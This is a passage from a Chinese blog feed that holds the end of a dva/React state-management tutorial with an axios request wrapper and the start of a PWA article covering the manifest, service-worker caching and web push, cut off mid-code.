在整个应用中，只有model中的reducer函数可以直接修改自己所在model的state参数，其余都是非法操作；并且必须使用return {...state}的形式进行修改 4.3.1 第一步：实现reducer函数12345678910111213141516171819202122232425262728293031323334353637383940// models/users.js// 使用静态数据返回，把userList中的静态数据移到此处// querySuccess这个action的作用在于，修改了model的数据export default &#123; namespace: 'users', state： &#123;&#125;， subscriptions: &#123;&#125;, effects: &#123;&#125;, reducers: &#123; querySuccess(state)&#123; const mock = &#123; total: 3, current: 1, loading: false, list: [ &#123; id: 1, name: '张三', age: 23, address: '成都', &#125;, &#123; id: 2, name: '李四', age: 24, address: '杭州', &#125;, &#123; id: 3, name: '王五', age: 25, address: '上海', &#125;, ] &#125;; // return 的内容是一个对象，涵盖原state中的所有属性，以实现“更新替换”的效果 return &#123;...state, ...mock, loading: false&#125;; &#125; &#125;&#125; 4.3.2 第二步：关联Model中的数据源12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849// routes/Users.jsximport React, &#123; PropTypes &#125; from 'react';// 最后用到了connect函数，需要在头部预先引入connectimport &#123; connect &#125; from 'dva';function Users(&#123; location, dispatch, users &#125;) &#123; const &#123; loading, list, total, current, currentItem, modalVisible, modalType &#125; = users; const userSearchProps=&#123;&#125;; // 使用传入的数据源，进行数据渲染 const userListProps=&#123; dataSource: list, total, loading, current, &#125;; const userModalProps=&#123;&#125;; return ( &lt;div className=&#123;styles.normal&#125;&gt; &#123;/* 用户筛选搜索框 */&#125; &lt;UserSearch &#123;...userSearchProps&#125; /&gt; &#123;/* 用户信息展示列表 */&#125; &lt;UserList &#123;...userListProps&#125; /&gt; &#123;/* 添加用户 &amp; 修改用户弹出的浮层 */&#125; &lt;UserModal &#123;...userModalProps&#125; /&gt; &lt;/div&gt; );&#125;// 声明组件的props类型Users.propTypes = &#123; users: PropTypes.object,&#125;;// 指定订阅数据，并且关联到users中function mapStateToProps(&#123; users &#125;) &#123; return &#123;users&#125;;&#125;// 建立数据关联关系export default connect(mapStateToProps)(Users); 4.3.3 第三步：通过发起Action，在组件中获取Model中的数据12345678910111213141516171819202122232425// models/users.js// 在组件生成后发出action，示例：componentDidMount() &#123; this.props.dispatch(&#123; type: 'model/action', // type对应action的名字 &#125;);&#125;// 在本次实践中，在访问/users/路由时，就是我们获取用户数据的时机// 因此把dispatch移至subscription中// subcription，订阅(或是监听)一个数据源，然后根据条件dispatch对应的action// 数据源可以是当前的时间、服务器的 websocket 连接、keyboard 输入、geolocation 变化、history 路由变化等等 // 此处订阅的数据源就是路由信息，当路由为/users，则派发'querySuccess'这个effects方法subscriptions: &#123; setup(&#123; dispatch, history &#125;) &#123; history.listen(location =&gt; &#123; if (location.pathname === '/users') &#123; dispatch(&#123; type: 'querySuccess', payload: &#123;&#125; &#125;); &#125; &#125;); &#125;, &#125;, 4.3.4 第四步： 在index.js中添加models123// model必须在此完成注册，才能全局有效// index.jsapp.model(require('./models/users.js')); 4.4 添加Effects Effects的作用在于处理异步函数，控制数据流程。因为在真实场景中，数据都来自服务器，需要在发起异步请求获得返回值后再设置数据，更新state。因此我们往往在Effects中调用reducer 12345678910111213141516171819202122232425262728293031323334353637export default &#123; namespace: 'users', state： &#123;&#125;， subscriptions: &#123;&#125;, effects: &#123; // 添加effects函数 // call与put是dva的函数 // call调用执行一个函数 // put则是dispatch执行一个action // select用于访问其他model *query(&#123; payload &#125;, &#123; select, call, put &#125;) &#123; yield put(&#123; type: 'showLoading' &#125;); const &#123; data &#125; = yield call(query); if (data) &#123; yield put(&#123; type: 'querySuccess', payload: &#123; list: data.data, total: data.page.total, current: data.page.current &#125; &#125;); &#125; &#125;, &#125;, reducers: &#123;&#125;&#125;// 添加请求处理 包含了一个ajax请求// models/users.jsimport request from '../utils/request';import qs from 'qs';async function query(params) &#123; return request(`/api/users?$&#123;qs.stringify(params)&#125;`);&#125; 4.5 把请求处理分离到service中 用意在于分离(可复用的)ajax请求 12345678910// services/users.jsimport request from '../utils/request';import qs from 'qs';export async function query(params) &#123; return request(`/api/users?$&#123;qs.stringify(params)&#125;`);&#125;// 在models中引用// models/users.jsimport &#123;query&#125; from '../services/users'; 五、使用dva框架和直接使用redux写法的区别5.1 使用 redux12345678910111213141516171819202122// action.jsexport const REQUEST_TODO = 'REQUEST_TODO';export const RESPONSE_TODO = 'RESPONSE_TODO';const request = count =&gt; (&#123;type: REQUEST_TODO, payload: &#123;loading: true, count&#125;&#125;);const response = count =&gt; (&#123;type: RESPONSE_TODO, payload: &#123;loading: false, count&#125;&#125;);export const fetch = count =&gt; &#123; return (dispatch) =&gt; &#123; dispatch(request(count)); return new Promise(resolve =&gt; &#123; setTimeout(() =&gt; &#123; resolve(count + 1); &#125;, 1000) &#125;).then(data =&gt; &#123; dispatch(response(data)) &#125;) &#125;&#125; 12345678910111213141516//reducer.jsimport &#123; REQUEST_TODO, RESPONSE_TODO &#125; from './actions';export default (state = &#123; loading: false, count: 0&#125;, action) =&gt; &#123; switch (action.type) &#123; case REQUEST_TODO: return &#123;...state, ...action.payload&#125;; case RESPONSE_TODO: return &#123;...state, ...action.payload&#125;; default: return state; &#125;&#125; 12345678910111213141516171819202122232425// app.jsimport React from &apos;react&apos;;import &#123; bindActionCreators &#125; from &apos;redux&apos;;import &#123; connect &#125; from &apos;react-redux&apos;;import * as actions from &apos;./actions&apos;;const App = (&#123;fetch, count, loading&#125;) =&gt; &#123; return ( &lt;div&gt; &#123;loading ? &lt;div&gt;loading...&lt;/div&gt; : &lt;div&gt;&#123;count&#125;&lt;/div&gt;&#125; &lt;button onClick=&#123;() =&gt; fetch(count)&#125;&gt;add&lt;/button&gt; &lt;/div&gt; )&#125;function mapStateToProps(state) &#123; return state;&#125;function mapDispatchToProps(dispatch) &#123; return bindActionCreators(actions, dispatch)&#125;export default connect(mapStateToProps, mapDispatchToProps)(App) 123456789101112131415161718//index.jsimport &#123; render &#125; from 'react-dom';import &#123; createStore, applyMiddleware &#125; from 'redux';import &#123; Provider &#125; from 'react-redux'import thunkMiddleware from 'redux-thunk';import reducer from './app/reducer';import App from './app/app';const store = createStore(reducer, applyMiddleware(thunkMiddleware));render( &lt;Provider store=&#123;store&#125;&gt; &lt;App/&gt; &lt;/Provider&gt; , document.getElementById('app')) 5.2 使用dva123456789101112131415161718192021222324252627282930313233343536// model.jsexport default &#123; namespace: &apos;demo&apos;, state: &#123; loading: false, count: 0 &#125;, reducers: &#123; request(state, payload) &#123; return &#123;...state, ...payload&#125;; &#125;, response(state, payload) &#123; return &#123;...state, ...payload&#125;; &#125; &#125;, effects: &#123; *&apos;fetch&apos;(action, &#123;put, call&#125;) &#123; yield put(&#123;type: &apos;request&apos;, loading: true&#125;); let count = yield call((count) =&gt; &#123; return new Promise(resolve =&gt; &#123; setTimeout(() =&gt; &#123; resolve(count + 1); &#125;, 1000); &#125;); &#125;, action.count); yield put(&#123; type: &apos;response&apos;, loading: false, count &#125;); &#125; &#125;&#125; 123456789101112131415161718192021222324252627//app.jsimport React from 'react'import &#123; connect &#125; from 'dva';const App = (&#123;fetch, count, loading&#125;) =&gt; &#123; return ( &lt;div&gt; &#123;loading ? &lt;div&gt;loading...&lt;/div&gt; : &lt;div&gt;&#123;count&#125;&lt;/div&gt;&#125; &lt;button onClick=&#123;() =&gt; fetch(count)&#125;&gt;add&lt;/button&gt; &lt;/div&gt; )&#125;function mapStateToProps(state) &#123; return state.demo;&#125;function mapDispatchToProps(dispatch) &#123; return &#123; fetch(count)&#123; dispatch(&#123;type: 'demo/fetch', count&#125;); &#125; &#125;&#125;export default connect(mapStateToProps, mapDispatchToProps)(App) 1234567891011121314// index.jsimport dva from 'dva';import model from './model';import App from './app';const app = dva();app.use(&#123;&#125;);app.model(model);app.router(() =&gt; &lt;App /&gt;);app.start(); 使用 redux 需要拆分出action模块和reducer模块 dva将action和reducer封装到model中，异步流程采用Generator处理 六、使用axios统一处理6.1 示例代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118// request.jsimport axios from 'axios';import NProgress from 'nprogress';import &#123; notification, message &#125; from 'antd';import &#123; routerRedux &#125; from 'dva/router';import store from '../index';/** * 一、功能： * 1. 统一拦截http错误请求码； * 2. 统一拦截业务错误代码； * 3. 统一设置请求前缀 * |-- 每个 http 加前缀 baseURL = /api/v1，从配置文件中获取 apiPrefix * 4. 配置异步请求过渡状态：显示蓝色加载条表示正在请求中，避免给用户页面假死的不好体验。 * |-- 使用 NProgress 工具库。 * * 二、引包： * |-- axios：http 请求工具库 * |-- NProgress：异步请求过度条，在浏览器主体部分顶部显示蓝色小条 * |-- notification：Antd组件 &gt; 处理错误响应码提示信息 * |-- routerRedux：dva/router对象，用于路由跳转，错误响应码跳转相应页面 * |-- store：dva中对象，使用里面的 dispatch 对象，用于触发路由跳转 */// 设置全局参数，如响应超市时间，请求前缀等。axios.defaults.timeout = 5000axios.defaults.baseURL = '/api/v1';axios.defaults.withCredentials = true;// 状态码错误信息const codeMessage = &#123; 200: '服务器成功返回请求的数据。', 201: '新建或修改数据成功。', 202: '一个请求已经进入后台排队（异步任务）。', 204: '删除数据成功。', 400: '发出的请求有错误，服务器没有进行新建或修改数据的操作。', 401: '用户没有权限（令牌、用户名、密码错误）。', 403: '用户得到授权，但是访问是被禁止的。', 404: '发出的请求针对的是不存在的记录，服务器没有进行操作。', 406: '请求的格式不可得。', 410: '请求的资源被永久删除，且不会再得到的。', 422: '当创建一个对象时，发生一个验证错误。', 500: '服务器发生错误，请检查服务器。', 502: '网关错误。', 503: '服务不可用，服务器暂时过载或维护。', 504: '网关超时。',&#125;;// 添加一个请求拦截器，用于设置请求过渡状态axios.interceptors.request.use((config) =&gt; &#123; // 请求开始，蓝色过渡滚动条开始出现 NProgress.start(); return config;&#125;, (error) =&gt; &#123; return Promise.reject(error);&#125;);// 添加一个返回拦截器axios.interceptors.response.use((response) =&gt; &#123; // 请求结束，蓝色过渡滚动条消失 NProgress.done(); return response;&#125;, (error) =&gt; &#123; // 请求结束，蓝色过渡滚动条消失 // 即使出现异常，也要调用关闭方法，否则一直处于加载状态很奇怪 NProgress.done(); return Promise.reject(error);&#125;);export default function request (opt) &#123; // 调用 axios api，统一拦截 return axios(opt) .then((response) =&gt; // &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 请求成功 &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; console.log(`【$&#123;opt.method&#125; $&#123;opt.url&#125;】请求成功，响应数据：%o`, response); // 打印业务错误提示 if (response.data &amp;&amp; response.data.code != '0000') &#123; message.error(response.data.message); &#125; return &#123; ...response.data &#125;; &#125;) .catch((error) =&gt; &#123; // &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 请求失败 &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; // 请求配置发生的错误 if (!error.response) &#123; return console.log('Error', error.message); &#125; // 响应时状态码处理 const status = error.response.status; const errortext = codeMessage[status] || error.response.statusText; notification.error(&#123; message: `请求错误 $&#123;status&#125;`, description: errortext, &#125;); // 存在请求，但是服务器的返回一个状态码，它们都在2xx之外 const &#123; dispatch &#125; = store; if (status === 401) &#123; dispatch(routerRedux.push('/user/login')); &#125; else if (status === 403) &#123; dispatch(routerRedux.push('/exception/403')); &#125; else if (status &lt;= 504 &amp;&amp; status &gt;= 500) &#123; dispatch(routerRedux.push('/exception/500')); &#125; else if (status &gt;= 404 &amp;&amp; status &lt; 422) &#123; dispatch(routerRedux.push('/exception/404')); &#125; // 开发时使用，上线时删除 console.log(`【$&#123;opt.method&#125; $&#123;opt.url&#125;】请求失败，响应数据：%o`, error.response); return &#123; code: status, message: errortext &#125;; &#125;);&#125; 6.2 明确响应体 以微信小程序为例，请求响应数据分为两部分： 网络请求是否成功； 业务场景值。即便网络请求成功了，业务处理上可能有时也会出错，比如校验不通过 我们在拦截响应时要分别对这两部分进行处理 123456789response = &#123; status: 200, // 网络请求状态。 statusText: 'xxx', data: &#123; code: '1001', // 业务请求状态。这里 '0000' 表示业务没问题，其它都有问题 message: 'yyy', data: &#123; &#125;, &#125;&#125; 6.3 依赖包分析12345import axios from 'axios';import NProgress from 'nprogress';import &#123; notification, message &#125; from 'antd';import &#123; routerRedux &#125; from 'dva/router';import store from '../index'; import store from &#39;../index&#39;;这是 dva 中导出的对象。即下面代码最终导出的 app._store，引入它是因为 dispatch 对象在里面，我们需要 dispatch 对象进行路由跳转 1234567891011121314151617181920212223// index.jsimport dva from 'dva';import &#123; message &#125; from 'antd';import &#123; createBrowserHistory as createHistory &#125; from 'history';// 1. Initializeconst app = dva(&#123; history: createHistory(),&#125;);// 2. Pluginsapp.use(createLoading());// 3. Modelapp.model(require('./models/app/global').default);// 4. Routerapp.router(require('./router').default);// 5. Startapp.start('#root');export default app._store; 6.4 axios 全局配置1234// 设置全局参数，如响应超市时间，请求前缀等。axios.defaults.timeout = 5000axios.defaults.baseURL = '/api/v1';axios.defaults.withCredentials = true; axios 可以设置很多全局配置，具体可参阅 https://segmentfault.com/a/1190000008470355 6.5 加载 NProgress 过渡组件1234567891011121314151617181920/ 添加一个请求拦截器，用于设置请求过渡状态axios.interceptors.request.use((config) =&gt; &#123; // 请求开始，蓝色过渡滚动条开始出现 NProgress.start(); return config;&#125;, (error) =&gt; &#123; return Promise.reject(error);&#125;);// 添加一个返回拦截器axios.interceptors.response.use((response) =&gt; &#123; // 请求结束，蓝色过渡滚动条消失 NProgress.done(); return response;&#125;, (error) =&gt; &#123; // 请求结束，蓝色过渡滚动条消失 // 即使出现异常，也要调用关闭方法，否则一直处于加载状态很奇怪 NProgress.done(); return Promise.reject(error);&#125;); NProgress 的使用主要有两个方法，当调用 NProgress.start(); 时在浏览器顶部就会出现蓝色小条，当调用 NProgress.done(); 蓝色小条就会消失。我们分别在请求开始和接收到响应调用这两个方法 6.6 网络请求成功处理1234567891011.then((response) =&gt; // &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 请求成功 &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; console.log(`【$&#123;opt.method&#125; $&#123;opt.url&#125;】请求成功，响应数据：%o`, response); // 打印业务错误提示 if (response.data &amp;&amp; response.data.code != '0000') &#123; message.error(response.data.message); &#125; return &#123; ...response.data &#125;; &#125;) 网络请求状态码为 200-300 表示成功，此时还应该判断业务处理是否成功。这个根据具体项目具体规定，比如微信小程序有一套场景值。在实际项目中可以自行规定 code = &#39;0000&#39; 业务处理完全没问题，code = &#39;1111&#39;校验不通过，code = &#39;2222&#39; 数据库出错等等。 最后别忘了要返回具体对象 { ...response.data } 6.7 网络请求失败处理12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// 状态码错误信息const codeMessage = &#123; 200: '服务器成功返回请求的数据。', 201: '新建或修改数据成功。', 202: '一个请求已经进入后台排队（异步任务）。', 204: '删除数据成功。', 400: '发出的请求有错误，服务器没有进行新建或修改数据的操作。', 401: '用户没有权限（令牌、用户名、密码错误）。', 403: '用户得到授权，但是访问是被禁止的。', 404: '发出的请求针对的是不存在的记录，服务器没有进行操作。', 406: '请求的格式不可得。', 410: '请求的资源被永久删除，且不会再得到的。', 422: '当创建一个对象时，发生一个验证错误。', 500: '服务器发生错误，请检查服务器。', 502: '网关错误。', 503: '服务不可用，服务器暂时过载或维护。', 504: '网关超时。',&#125;;// ............catch((error) =&gt; &#123; // &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; 请求失败 &lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt;&lt; // 请求配置发生的错误 if (!error.response) &#123; return console.log('Error', error.message); &#125; // 响应时状态码处理 const status = error.response.status; const errortext = codeMessage[status] || error.response.statusText; notification.error(&#123; message: `请求错误 $&#123;status&#125;`, description: errortext, &#125;); // 存在请求，但是服务器的返回一个状态码，它们都在2xx之外 const &#123; dispatch &#125; = store; if (status === 401) &#123; dispatch(routerRedux.push('/user/login')); &#125; else if (status === 403) &#123; dispatch(routerRedux.push('/exception/403')); &#125; else if (status &lt;= 504 &amp;&amp; status &gt;= 500) &#123; dispatch(routerRedux.push('/exception/500')); &#125; else if (status &gt;= 404 &amp;&amp; status &lt; 422) &#123; dispatch(routerRedux.push('/exception/404')); &#125; // 开发时使用，上线时删除 console.log(`【$&#123;opt.method&#125; $&#123;opt.url&#125;】请求失败，响应数据：%o`, error.response); return &#123; code: status, message: errortext &#125;; &#125;); 网络请求失败，首先需要根据 status 打印提示消息，告诉用户为什么请求失败。如响应码为 401，那么提示用户的文字就会是 用户没有权限（令牌、用户名、密码错误） 如果是 401 错误，表示用户没有权限访问或者用户名密码输入错误，应该跳转到登录页面：dispatch(routerRedux.push(&#39;/user/login&#39;)); 七、更多参考 dva官方教程 官方文档 使用Dva的所有知识点 Dva-React 应用框架在蚂蚁金服的实践 roadhog介绍 创建一个 dva 脚手架工程 dva 脚手架目录分析 12 步 30 分钟，完成用户管理的 CURD 应用 (react+dva+antd) dva router4.0 使用实践总结 dva 2.0中如何使用代码进行路由跳转 dva 配置 browserHistory 实践总结 dva-loading 实践用法 dva 升级2.0版本遇到的问题小结 dva 中进行页面复用实践总结 Dva知识地图 dva-API文档","categories":[{"name":"Front-End","slug":"Front-End","permalink":"https://ru23.com/categories/Front-End/"}],"tags":[{"name":"Dva","slug":"Dva","permalink":"https://ru23.com/tags/Dva/"},{"name":"React","slug":"React","permalink":"https://ru23.com/tags/React/"}]},{"title":"浅谈PWA(Progressive Web App)","slug":"2018-09-pwa","date":"2018-09-04T10:00:43.000Z","updated":"2018-10-24T03:46:02.621Z","comments":true,"path":"note/c8cbf86a.html","link":"","permalink":"https://ru23.com/note/c8cbf86a.html","excerpt":"","text":"一、初识PWA PWA，即Progressive Web App, 是提升 Web App 的体验的一种新方法，能给用户原生应用的体验。 一个 PWA 应用首先是一个网页, 可以通过 Web 技术编写出一个网页应用. 随后添加上 App Manifest 和 Service Worker 来实现PWA 的安装和离线等功能 1.1 PWA中的一些技术 PWA本身其实是一个概念集合，它不是指某一项技术，而是通过一系列的Web技术与Web标准来优化Web App的安全、性能和体验。其中涉及到的一些技术概念包括了 Web App Manifest Service Worker Cache API 缓存 Push、Notification 推送与通知 Background Sync后台同步 响应式设计 1.2 解决了哪些问题 可以添加至主屏幕，点击主屏幕图标可以实现启动动画以及隐藏地址栏 实现离线缓存功能，即使用户手机没有网络，依然可以使用一些离线功能 实现了消息推送 1.3 PWA存在的问题 支持率不高:现在ios手机端不支持pwa，IE也暂时不支持Chrome在中国桌面版占有率还是不错的，安卓移动端上的占有率却很低 各大厂商还未明确支持pwa 依赖的GCM服务在国内无法使用 微信小程序的竞争 尽管有上述的一些缺点，PWA技术仍然有很多可以使用的点。 service worker技术实现离线缓存，可以将一些不经常更改的静态文件放到缓存中，提升用户体验。 service worker实现消息推送，使用浏览器推送功能，吸引用户渐进式开发，尽管一些浏览器暂时不支持，可以利用上述技术给使用支持浏览器的用户带来更好的体验 二、PWA的实现2.1 Manifest实现添加至主屏幕123456789&lt;!--index.html--&gt;&lt;head&gt; &lt;title&gt;Minimal PWA&lt;/title&gt; &lt;meta name=\"viewport\" content=\"width=device-width, user-scalable=no\" /&gt; &lt;link rel=\"manifest\" href=\"manifest.json\" /&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"main.css\"&gt; &lt;link rel=\"icon\" href=\"/e.png\" type=\"image/png\" /&gt;&lt;/head&gt; 123456789101112131415161718192021222324252627282930// manifest.json&#123; \"name\": \"Minimal PWA\", // 必填 显示的插件名称 \"short_name\": \"PWA Demo\", // 可选 在APP launcher和新的tab页显示，如果没有设置，则使用name \"description\": \"The app that helps you understand PWA\", //用于描述应用 \"display\": \"standalone\", // 定义开发人员对Web应用程序的首选显示模式。standalone模式会有单独的 \"start_url\": \"/\", // 应用启动时的url \"theme_color\": \"#313131\", // 桌面图标的背景色 \"background_color\": \"#313131\", // 为web应用程序预定义的背景颜色。在启动web应用程序和加载应用程序的内容之间创建了一个平滑的过渡。 \"icons\": [ // 桌面图标，是一个数组 &#123; \"src\": \"icon/lowres.webp\", \"sizes\": \"48x48\", // 以空格分隔的图片尺寸 \"type\": \"image/webp\" // 帮助userAgent快速排除不支持的类型 &#125;, &#123; \"src\": \"icon/lowres\", \"sizes\": \"48x48\" &#125;, &#123; \"src\": \"icon/hd_hi.ico\", \"sizes\": \"72x72 96x96 128x128 256x256\" &#125;, &#123; \"src\": \"icon/hd_hi.svg\", \"sizes\": \"72x72\" &#125; ]&#125; Manifest参考文档：https://developer.mozilla.org/zh-CN/docs/Web/Manifest 如果用的是安卓手机，可以下载chrome浏览器自己操作看看 2.2 service worker实现离线缓存2.2.1 什么是service worker Service Worker 是 Chrome 团队提出和力推的一个 WEB API，用于给 web 应用提供高级的可持续的后台处理能力 image.png Service Workers 就像介于服务器和网页之间的拦截器，能够拦截进出的HTTP 请求，从而完全控制你的网站 2.2.2 最主要的特点 在页面中注册并安装成功后，运行于浏览器后台，不受页面刷新的影响，可以监听和截拦作用域范围内所有页面的 HTTP 请求。 网站必须使用 HTTPS。除了使用本地开发环境调试时(如域名使用 localhost) 运行于浏览器后台，可以控制打开的作用域范围下所有的页面请求 单独的作用域范围，单独的运行环境和执行线程 不能操作页面 DOM。但可以通过事件机制来处理 事件驱动型服务线程 为什么要求网站必须是HTTPS的，大概是因为service worker权限太大能拦截所有页面的请求，如果http的网站安装service worker很容易被攻击 2.2.3 生命周期 image.png 当用户首次导航至 URL 时，服务器会返回响应的网页。 第1步:当你调用 register() 函数时， Service Worker开始下载。 第2步:在注册过程中，浏览器会下载、解析并执行 Service Worker ()。如果在此步骤中出现任何错误，register()返回的 promise 都会执行 reject操作，并且 Service Worker 会被废弃。 第3步:一旦 Service Worker 成功执行了，install 事件就会激活 第4步:安装完成，Service Worker 便会激活，并控制在其范围内的一切。如果生命周期中的所有事件都成功了，Service Worker便已准备就绪，随时可以使用了！ chrome://serviceworker-internals 来了解当前浏览器中所有已安装Service Worker的详细情况 2.2.4 实现离线缓存HTTP缓存 Web 服务器可以使用 Expires 首部来通知 Web客户端，它可以使用资源的当前副本，直到指定的“过期时间”。反过来，浏览器可以缓存此资源，并且只有在有效期满后才会再次检查新版本。使用 HTTP 缓存意味着你要依赖服务器来告诉你何时缓存资源和何时过期 service worker缓存 Service Workers的强大在于它们拦截 HTTP 请求的能力进入任何传入的HTTP 请求，并决定想要如何响应。在你的 Service Worker 中，可以编写逻辑来决定想要缓存的资源，以及需要满足什么条件和资源需要缓存多久。一切尽归你掌控！ 123456789101112131415161718192021222324252627&lt;!--index.html--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Hello Caching World!&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;!-- Image --&gt; &lt;img src=\"/images/hello.png\" /&gt; &lt;!-- JavaScript --&gt; &lt;script async src=\"/js/script.js\"&gt;&lt;/script&gt; &lt;script&gt; // 注册 service worker if ('serviceWorker' in navigator) &#123; navigator.serviceWorker.register('/service-worker.js', &#123;scope: '/'&#125;).then(function (registration) &#123; // 注册成功 console.log('ServiceWorker registration successful with scope: ', registration.scope); &#125;).catch(function (err) &#123; // 注册失败 :( console.log('ServiceWorker registration failed: ', err); &#125;); &#125; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 注：Service Worker的注册路径决定了其 scope默认作用页面的范围。 如果 service-worker.js是在 /sw/ 页面路径下，这使得该 Service Worker 默认只会收到 页面/sw/ 路径下的 fetch 事件。 如果存放在网站的根路径下，则将会收到该网站的所有 fetch事件。 如果希望改变它的作用域，可在第二个参数设置 scope 范围。示例中将其改为了根目录，即对整个站点生效。 12345678910111213141516171819202122232425262728293031323334353637383940414243// service-worker.jsvar cacheName = 'helloWorld'; // 缓存的名称 // install 事件，它发生在浏览器安装并注册 Service Worker 时 self.addEventListener('install', event =&gt; &#123; /* event.waitUtil 用于在安装成功之前执行一些预装逻辑 但是建议只做一些轻量级和非常重要资源的缓存，减少安装失败的概率 安装成功后 ServiceWorker 状态会从 installing 变为 installed */ event.waitUntil( caches.open(cacheName) .then(cache =&gt; cache.addAll([ // 如果所有的文件都成功缓存了，便会安装完成。如果任何文件下载失败了，那么安装过程也会随之失败。 '/js/script.js', '/images/hello.png' ])) );&#125;); /**为 fetch 事件添加一个事件监听器。接下来，使用 caches.match() 函数来检查传入的请求 URL 是否匹配当前缓存中存在的任何内容。如果存在的话，返回缓存的资源。如果资源并不存在于缓存当中，通过网络来获取资源，并将获取到的资源添加到缓存中。*/self.addEventListener('fetch', function (event) &#123; event.respondWith( caches.match(event.request) .then(function (response) &#123; if (response) &#123; return response; &#125; var requestToCache = event.request.clone(); // return fetch(requestToCache).then( function (response) &#123; if (!response || response.status !== 200) &#123; return response; &#125; var responseToCache = response.clone(); caches.open(cacheName) .then(function (cache) &#123; cache.put(requestToCache, responseToCache); &#125;); return response; &#125;) );&#125;); 注：为什么用request.clone()和response.clone()需要这么做是因为request和response是一个流，它只能消耗一次。因为我们已经通过缓存消耗了一次，然后发起 HTTP 请求还要再消耗一次，所以我们需要在此时克隆请求Clone the request—a request is a stream and can only be consumed once 2.2.5 调试相关 chrome浏览器打开https://googlechrome.github.io/samples/service-worker/basic/index.html，这是一个实现了service worker离线缓存功能的网站，打开调试工具 image.png 勾选可以模拟网站离线情况，勾选后network会有一个黄色警告图标，该网站已经离线。此时刷新页面，页面仍然能够正常显示 当前service worker的scope。它能够拦截https://googlechrome.github.i…，同样也能够拦截https://googlechrome.github.i.../.html下的请求 调试面板具体代表的什么参看 https://x5.tencent.com/tbs/guide/serviceworker.html的第三部分 2.3 serice worker实现消息推送 image.png 步骤一、提示用户并获得他们的订阅详细信息 步骤二、将这些详细信息保存在服务器上 步骤三、在需要时发送任何消息 不同浏览器需要用不同的推送消息服务器。以 Chrome 上使用 Google Cloud Messaging&lt;GCM&gt; 作为推送服务为例，第一步是注册 applicationServerKey(通过 GCM 注册获取)，并在页面上进行订阅或发起订阅。每一个会话会有一个独立的端点（endpoint），订阅对象的属性(PushSubscription.endpoint) 即为端点值。将端点发送给服务器后，服务器用这一值来发送消息给会话的激活的 Service Worker （通过 GCM 与浏览器客户端沟通 步骤一和步骤二 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667&lt;!--index.html--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Progressive Times&lt;/title&gt; &lt;link rel=\"manifest\" href=\"/manifest.json\"&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var endpoint; var key; var authSecret; var vapidPublicKey = 'BAyb_WgaR0L0pODaR7wWkxJi__tWbM1MPBymyRDFEGjtDCWeRYS9EF7yGoCHLdHJi6hikYdg4MuYaK0XoD0qnoY'; // 方法很复杂，但是可以不用具体看，知识用来转化vapidPublicKey用 function urlBase64ToUint8Array(base64String) &#123; const padding = '='.repeat((4 - base64String.length % 4) % 4); const base64 = (base64String + padding) .replace(/\\-/g, '+') .replace(/_/g, '/'); const rawData = window.atob(base64); const outputArray = new Uint8Array(rawData.length); for (let i = 0; i &lt; rawData.length; ++i) &#123; outputArray[i] = rawData.charCodeAt(i); &#125; return outputArray; &#125; if ('serviceWorker' in navigator) &#123; navigator.serviceWorker.register('sw.js').then(function (registration) &#123; return registration.pushManager.getSubscription() .then(function (subscription) &#123; if (subscription) &#123; return; &#125; return registration.pushManager.subscribe(&#123; userVisibleOnly: true, applicationServerKey: urlBase64ToUint8Array(vapidPublicKey) &#125;) .then(function (subscription) &#123; var rawKey = subscription.getKey ? subscription.getKey('p256dh') : ''; key = rawKey ? btoa(String.fromCharCode.apply(null, new Uint8Array(rawKey))) : ''; var rawAuthSecret = subscription.getKey ? subscription.getKey('auth') : ''; authSecret = rawAuthSecret ? btoa(String.fromCharCode.apply(null, new Uint8Array(rawAuthSecret))) : ''; endpoint = subscription.endpoint; return fetch('./register', &#123; method: 'post', headers: new Headers(&#123; 'content-type': 'application/json' &#125;), body: JSON.stringify(&#123; endpoint: subscription.endpoint, key: key, authSecret: authSecret, &#125;), &#125;); &#125;); &#125;); &#125;).catch(function (err) &#123; // 注册失败 :( console.log('ServiceWorker registration failed: ', err); &#125;); &#125; &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 步骤三 服务器发送消息给service worker 1234567891011121314151617181920212223242526272829303132333435363738// app.jsconst webpush = require('web-push'); const express = require('express');var bodyParser = require('body-parser');const app = express();webpush.setVapidDetails( 'mailto:contact@deanhume.com', 'BAyb_WgaR0L0pODaR7wWkxJi__tWbM1MPBymyRDFEGjtDCWeRYS9EF7yGoCHLdHJi6hikYdg4MuYaK0XoD0qnoY', 'p6YVD7t8HkABoez1CvVJ5bl7BnEdKUu5bSyVjyxMBh0');app.post('/register', function (req, res) &#123; var endpoint = req.body.endpoint; saveRegistrationDetails(endpoint, key, authSecret); const pushSubscription = &#123; endpoint: req.body.endpoint, keys: &#123; auth: req.body.authSecret, p256dh: req.body.key &#125; &#125;; var body = 'Thank you for registering'; var iconUrl = 'https://example.com/images/homescreen.png'; // 发送 Web 推送消息 webpush.sendNotification(pushSubscription, JSON.stringify(&#123; msg: body, url: 'http://localhost:3111/', icon: iconUrl &#125;)) .then(result =&gt; 